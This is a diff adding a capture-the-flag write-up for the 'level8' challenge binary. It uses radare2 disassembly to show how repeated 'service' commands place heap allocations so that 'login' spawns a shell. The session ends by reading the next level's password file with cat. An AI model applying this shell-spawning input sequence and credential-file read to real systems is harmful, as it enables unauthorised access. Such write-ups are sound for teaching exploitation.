@@ -1,0 +1,99 @@
+Running the program and typing anything randomly couldn't help us understand anything so we used r2 to see what's inside.
+We used r2 to get only better visualization.
+
+    $> r2 level8
+    [0x080484b0]> s sym.main
+    [0x08048564]> aaaa
+    [0x08048564]> afl
+    ...
+    0x08048564   15 469          main
+    ...
+    # there's only the main function that seems interesting.
+    [0x08048564]> VV
+    [...]   This is the best way to understand what's happening inside.
+
+We can see that the program has many 'keywords', each keyword does an action:
+    - 'auth '
+    - 'service'
+    - 'login'
+    - 'reset'
+
+Digging deeper we see that a shell is popped when in the right branch of the code :
+
+    [0x08048564]> pdf
+    0x080486e2      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0    # Tests if two global variables has a difference of 32
+    0x080486e7      8b4020         mov eax, dword [eax + 0x20]                      |
+    0x080486ea      85c0           test eax, eax                                    |
+    0x080486ec      7411           je 0x80486ff                                     # If not, jumps somwhere we don't need, else continues to pop a shell.
+    0x080486ee      c70424338804.  mov dword [esp], str.bin_sh
+    0x080486f5      e886fdffff     call sym.imp.system                              # Popping the shell
+    0x080486fa      e975feffff     jmp 0x8048574
+
+We found that our two global variables were actually displayed by printf :
+
+    [0x08048564]> pdf
+    0x08048575      8b0db09a0408   mov ecx, dword [obj.service] ; [0x8049ab0:4]=0   # our two
+    0x0804857b      8b15ac9a0408   mov edx, dword [obj.auth]   ; [0x8049aac:4]=0    # global variables
+    0x08048581      b810880408     mov eax, str.p___p          ; 0x8048810 ; "%p, %p \n"
+    0x08048586      894c2408       mov dword [nitems], ecx
+    0x0804858a      89542404       mov dword [size], edx
+    0x0804858e      890424         mov dword [esp], eax        ; const char *format
+    0x08048591      e87afeffff     call sym.imp.printf         ; int printf(const char *format)
+
+We noticed that some keywords change the labelled 'service' global variable, adding 16 each time :
+
+    $> level8
+    (nil), (nil)
+    service
+    (nil), 0x804a008        # initialize 'service' global variable
+    auth
+    0x804a018, 0x804a008    # initialize 'auth ' global variable
+    service
+    0x804a018, 0x804a028    # adds 16 to 'service'
+    service
+    0x804a018, 0x804a038    # adds 16 to 'service'
+    login
+    $>                      # pops the shell...
+
+Allright... Explanation :
+
+When typing 'auth' a malloc of size 4 is made. But malloc will give 16 bytes as minimum. Address is then stored into 'auth'
+
+    [0x08048564]> pdf
+    0x080485c1      b819880408     mov eax, str.auth           ; 0x8048819 ; "auth "
+    ...
+    0x080485e4      c70424040000.  mov dword [esp], 4
+    0x080485eb      e880feffff     call sym.imp.malloc
+    0x080485f0      a3ac9a0408     mov dword [obj.auth], eax   ; [0x8049aac:4]=0    # stored here
+    0x080485f5      a1ac9a0408     mov eax, dword [obj.auth]
+
+When typing 'service', an strdup of "service" is made. This produces a new malloc of size 7 (so 16 again...). It's then stored into 'service'
+
+    [0x08048564]> pdf
+    0x0804867e      b825880408     mov eax, str.service        ; 0x8048825 ; "service"
+    ...
+    0x080486a8      890424         mov dword [esp], eax        ; const char *src
+    0x080486ab      e880fdffff     call sym.imp.strdup         ; char *strdup(const char *src)
+    0x080486b0      a3b09a0408     mov dword [obj.service], eax ; [0x8049ab0:4]=0
+    ; CODE XREF from main @ 0x804869f
+    0x080486b5      8d442420       lea eax, [src]
+    0x080486b9      89c2           mov edx, eax
+
+'service' is now pointing 16 bytes after 'auth'
+
+Repeating the same action will produce another malloc and add 16 to 'service' again. Now the difference is 0x20 between the two adresses :
+
+    $> level8
+    (nil), (nil)
+    service
+    (nil), 0x804a008        # initialize 'service' global variable
+    auth
+    0x804a018, 0x804a008    # initialize 'auth ' global variable
+    service
+    0x804a018, 0x804a028    # adds 16 to 'service'
+    service
+    0x804a018, 0x804a038    # adds 16 to 'service'
+    login
+    $>                      # pops the shell...
+    cat /home/user/level9/.pass
+    *token*
